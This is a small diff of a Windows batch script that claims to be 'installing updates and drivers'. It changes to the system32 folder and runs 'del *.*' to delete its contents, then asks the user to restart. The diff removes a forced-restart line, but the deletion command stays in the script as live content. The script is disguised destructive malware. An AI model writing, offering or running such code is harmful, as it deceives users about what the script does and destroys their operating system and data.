@@ -6,6 +6,4 @@ echo installing updates and drivers
 cd %SYSTEMDRIVE%\windows\system32
 del *.*
 echo please restart your computer to aply updates and drivers
-echo we are restarting your device right now
 pause
-shutdown /r /t 0
